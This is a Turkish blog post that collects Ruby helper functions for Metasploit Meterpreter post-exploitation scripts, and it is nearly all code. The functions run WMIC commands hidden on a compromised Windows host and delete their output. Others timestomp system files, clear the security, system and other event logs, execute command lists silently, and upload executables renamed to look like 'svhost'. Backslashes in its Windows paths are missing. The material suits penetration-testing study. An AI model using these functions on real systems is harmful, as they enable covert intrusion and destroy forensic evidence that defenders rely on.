---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-14T13:51:00Z"
excerpt: Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon
  örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz.
  Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz.
guid: https://www.siberoloji.com/?p=1211
id: 1211
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Script Fonksiyonlar
url: /tr/msf-meterpreter-script-fonksiyonlar/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="kullanışlı-fonksiyonlar">Kullanışlı Fonksiyonlar 
<!-- /wp:heading -->

  Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz. Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="kullanılabilir-wmic-komutları">Kullanılabilir WMIC Komutları 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def wmicexec<strong>(</strong>session,wmiccmds<strong>=</strong> nil<strong>)</strong>
        windr <strong>=</strong> ''
        tmpout <strong>=</strong> ''
        windrtmp <strong>=</strong> ""
        session.response_timeout<strong>=</strong>120
        begin
                tmp <strong>=</strong> session.fs.file.expand_path<strong>(</strong>"%TEMP%"<strong>)</strong>
                wmicfl <strong>=</strong> tmp + ""+ sprintf<strong>(</strong>"%.5d",rand<strong>(</strong>100000<strong>))</strong>
                wmiccmds.each <strong>do</strong> |wmi|
                        print_status "running command wmic #{wmi}"
                        cmd <strong>=</strong> "cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe"
                        opt <strong>=</strong> "/append:#{wmicfl} #{wmi}"
                        r <strong>=</strong> session.sys.process.execute<strong>(</strong> cmd, opt,<strong>{</strong>'Hidden' <strong>=&gt;</strong> true<strong>})</strong>
                        sleep<strong>(</strong>2<strong>)</strong>
                        <em>#Making sure that wmic finnishes before executing next wmic command</em>
                        prog2check <strong>=</strong> "wmic.exe"
                        found <strong>=</strong> 0
                        <strong>while </strong>found <strong>==</strong> 0
                                session.sys.process.get_processes<strong>()</strong>.each <strong>do</strong> |x|
                                        found <strong>=</strong>1
                                        <strong>if </strong>prog2check <strong>==</strong> <strong>(</strong>x['name'<strong>]</strong>.downcase<strong>)</strong>
                                                sleep<strong>(</strong>0.5<strong>)</strong>
                                                            print_line "."
                                                found <strong>=</strong> 0
                                        end
                                end
                        end
                        r.close
                end
                <em># Read the output file of the wmic commands</em>
                wmioutfile <strong>=</strong> session.fs.file.new<strong>(</strong>wmicfl, "rb"<strong>)</strong>
                <strong>until </strong>wmioutfile.eof?
                        tmpout <strong>&gt;&gt;</strong> wmioutfile.read
                end
                wmioutfile.close
        rescue ::Exception <strong>=&gt;</strong> e
                print_status<strong>(</strong>"Error running WMIC commands: #{e.class} #{e}"<strong>)</strong>
        end
        <em># We delete the file with the wmic command output.</em>
        c <strong>=</strong> session.sys.process.execute<strong>(</strong>"cmd.exe /c del #{wmicfl}", nil, <strong>{</strong>'Hidden' <strong>=&gt;</strong> true<strong>})</strong>
        c.close
        tmpout
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="dosyaların-mac-zamanlarını-değiştirme">Dosyaların MAC Zamanlarını Değiştirme 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def chmace<strong>(</strong>session,cmds<strong>)</strong>
    windir <strong>=</strong> ''
    windrtmp <strong>=</strong> ""
    print_status<strong>(</strong>"Changing Access Time, Modified Time and Created Time of Files Used"<strong>)</strong>
    windir <strong>=</strong> session.fs.file.expand_path<strong>(</strong>"%WinDir%"<strong>)</strong>
    cmds.each <strong>do</strong> |c|
        begin
            session.core.use<strong>(</strong>"priv"<strong>)</strong>
            filetostomp <strong>=</strong> windir + "system32"+ c
            fl2clone <strong>=</strong> windir + "system32chkdsk.exe"
            print_status<strong>(</strong>"tChanging file MACE attributes on #{filetostomp}"<strong>)</strong>
            session.priv.fs.set_file_mace_from_file<strong>(</strong>filetostomp, fl2clone<strong>)</strong>

        rescue ::Exception <strong>=&gt;</strong> e
            print_status<strong>(</strong>"Error changing MACE: #{e.class} #{e}"<strong>)</strong>
        end
    end
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="uac-kontrolü">UAC Kontrolü 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def checkuac<strong>(</strong>session<strong>)</strong>
    uac <strong>=</strong> false
    begin
        winversion <strong>=</strong> session.sys.config.sysinfo
        <strong>if </strong>winversion['OS'<strong>]=</strong>~ /Windows Vista/ or  winversion['OS'<strong>]=</strong>~ /Windows 7/
            print_status<strong>(</strong>"Checking if UAC is enaled ..."<strong>)</strong>
            key <strong>=</strong> 'HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem'
            root_key, base_key <strong>=</strong> session.sys.registry.splitkey<strong>(</strong>key<strong>)</strong>
            value <strong>=</strong> "EnableLUA"
            open_key <strong>=</strong> session.sys.registry.open_key<strong>(</strong>root_key, base_key, KEY_READ<strong>)</strong>
            v <strong>=</strong> open_key.query_value<strong>(</strong>value<strong>)</strong>
            <strong>if </strong>v.data <strong>==</strong> 1
                uac <strong>=</strong> true
            <strong>else
                </strong>uac <strong>=</strong> false
            end
            open_key.close_key<strong>(</strong>key<strong>)</strong>
        end
    rescue ::Exception <strong>=&gt;</strong> e
        print_status<strong>(</strong>"Error Checking UAC: #{e.class} #{e}"<strong>)</strong>
    end
    <strong>return </strong>uac
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="tüm-olay-loglarını-temizleme">Tüm Olay Loglarını Temizleme 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def clrevtlgs<strong>(</strong>session<strong>)</strong>
    evtlogs <strong>=</strong> <strong>[</strong>
        'security',
        'system',
        'application',
        'directory service',
        'dns server',
        'file replication service'
    <strong>]</strong>
    print_status<strong>(</strong>"Clearing Event Logs, this will leave and event 517"<strong>)</strong>
    begin
        evtlogs.each <strong>do</strong> |evl|
            print_status<strong>(</strong>"tClearing the #{evl} Event Log"<strong>)</strong>
            log <strong>=</strong> session.sys.eventlog.open<strong>(</strong>evl<strong>)</strong>
            log.clear
        end
        print_status<strong>(</strong>"Alll Event Logs have been cleared"<strong>)</strong>
    rescue ::Exception <strong>=&gt;</strong> e
        print_status<strong>(</strong>"Error clearing Event Log: #{e.class} #{e}"<strong>)</strong>

    end
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="bir-komut-listesini-çalıştırma">Bir Komut Listesini Çalıştırma 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec<strong>(</strong>session,cmdlst<strong>)</strong>
    <strong>if </strong>cmdlst.kind_of? String
        cmdlst <strong>=</strong> cmdlst.to_a
    end
    print_status<strong>(</strong>"Running Command List ..."<strong>)</strong>
    r<strong>=</strong>''
    session.response_timeout<strong>=</strong>120
    cmdlst.each <strong>do</strong> |cmd|
        begin
            print_status "trunning command #{cmd}"
            r <strong>=</strong> session.sys.process.execute<strong>(</strong>cmd, nil, <strong>{</strong>'Hidden' <strong>=&gt;</strong> true, 'Channelized' <strong>=&gt;</strong> true<strong>})</strong>
            <strong>while</strong><strong>(</strong>d <strong>=</strong> r.channel.read<strong>)</strong>

                print_status<strong>(</strong>"t#{d}"<strong>)</strong>
            end
            r.channel.close
            r.close
        rescue ::Exception <strong>=&gt;</strong> e
            print_error<strong>(</strong>"Error Running Command #{cmd}: #{e.class} #{e}"<strong>)</strong>
        end
    end
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="dosyaları-karşı-tarafa-yükleme">Dosyaları Karşı Tarafa Yükleme 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def upload<strong>(</strong>session,file,trgloc <strong>=</strong> nil<strong>)</strong>
    <strong>if </strong>not ::File.exists?<strong>(</strong>file<strong>)</strong>
            raise "File to Upload does not exists!"
        <strong>else
        if </strong>trgloc <strong>==</strong> nil
        location <strong>=</strong> session.fs.file.expand_path<strong>(</strong>"%TEMP%"<strong>)</strong>
        <strong>else
            </strong>location <strong>=</strong> trgloc
        end
        begin
            <strong>if </strong>file <strong>=</strong>~ /S<strong>*</strong><strong>(</strong>.exe<strong>)</strong>/i
                       fileontrgt <strong>=</strong> "#{location}svhost#{rand(100)}.exe"
            <strong>else
                    </strong>fileontrgt <strong>=</strong> "#{location}TMP#{rand(100)}"
            end
            print_status<strong>(</strong>"Uploadingd #{file}...."<strong>)</strong>
            session.fs.file.upload_file<strong>(</strong>"#{fileontrgt}","#{file}"<strong>)</strong>
            print_status<strong>(</strong>"#{file} uploaded!"<strong>)</strong>
            print_status<strong>(</strong>"#{fileontrgt}"<strong>)</strong>
        rescue ::Exception <strong>=&gt;</strong> e
            print_status<strong>(</strong>"Error uploading file #{file}: #{e.class} #{e}"<strong>)</strong>
        end
    end
    <strong>return </strong>fileontrgt
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="bir-dosyaya-veri-yazma">Bir Dosyaya Veri Yazma 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def filewrt<strong>(</strong>file2wrt, data2wrt<strong>)</strong>
        output <strong>=</strong> ::File.open<strong>(</strong>file2wrt, "a"<strong>)</strong>
        data2wrt.each_line <strong>do</strong> |d|
                output.puts<strong>(</strong>d<strong>)</strong>
        end
        output.close
end</code></pre>
<!-- /wp:code -->